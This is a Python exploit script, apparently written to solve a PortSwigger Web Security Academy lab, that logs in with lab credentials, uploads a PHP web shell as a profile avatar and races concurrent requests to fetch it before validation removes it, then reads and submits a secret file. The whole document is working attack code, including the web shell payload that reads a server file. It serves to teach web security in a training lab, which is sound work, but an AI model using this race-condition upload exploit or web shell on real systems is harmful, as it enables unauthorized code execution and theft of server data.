##################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 14/10/2023
#
# Lab: Web shell upload via race condition
#
# Steps: 1. fetch the login page
#        2. Extract csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Upload the the shell file via race condition
#        6. Try to fetch the shell file concurrently from a different thread
#        7. Submit the solution
#
##################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore
import threading


####################
# Gloabl Variables
####################

# this variable is used to control the secondary thread
FOUND_SECRET = False


##############################################
# Function to send multiple upload requests
##############################################
def upload_requests(url, data, cookies, files):
    # use the global variable 
    global FOUND_SECRET

    # send the upload request multiple times
    # 10 times is enough
    for counter in range(1,11):
        # if you found the secret, stop sending requests
        if FOUND_SECRET:
            break
        
        else:
            try:  
                # upload shell file
                requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
                
            except:
                print(Fore.RED + "[!] Failed to upload the shell file through exception")

            print(Fore.WHITE + f"⦗5⦘ Uploading the shell file via race condition ({counter}/10).. " + Fore.GREEN + "OK")


###########
# Main
###########

# change this to your lab URL
url = "https://0ad500f504dd3b6283246e62000a0018.web-security-academy.net"

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)


print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

# the shell file to be uploaded
shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""

# the shell file name
# you can change this to what you want
shell_file_name = "hack.php"

# set the avatar
files = {
    "avatar": (shell_file_name, shell_file, "application/x-php")
}

# set the other data to send with the avatar
data = {
    "user": "wiener",
    "csrf": csrf 
}

# create a new thread
# this thread is used to send multiple upload requests concurrently with the fetch requests in the main thread
new_thread = threading.Thread(target=upload_requests, args=(url, data, cookies, files))

# start the new thread
new_thread.start()

# send the fetch request multiple times
# 10 times is enough
for counter in range(1,11):
    try:
        # fetch the uploaded shell file
        uploaded_shell = requests.get(f"{url}/files/avatars/{shell_file_name}", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to fetch the uploaded shell file through exception")
    
    print(Fore.WHITE + f"⦗6⦘ Fetching the uploaded shell file to read the secret ({counter}/10).. " + Fore.GREEN + "OK")
    
    # if you fetch the shell file successfully
    if uploaded_shell.status_code == 200:
        # get carlos secret
        secret = uploaded_shell.text

        # set the global variable to true to stop the secondary thread
        FOUND_SECRET = True

        # exit from the loop
        break
    
    else:
        continue

print(Fore.BLUE + "❯ Secret: " + Fore.YELLOW + secret)

# set answer
data = {
    "answer": secret
}

try:
    # submit the solution
    requests.post(f"{url}/submitSolution", data)

except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "⦗7⦘ Submitting the solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


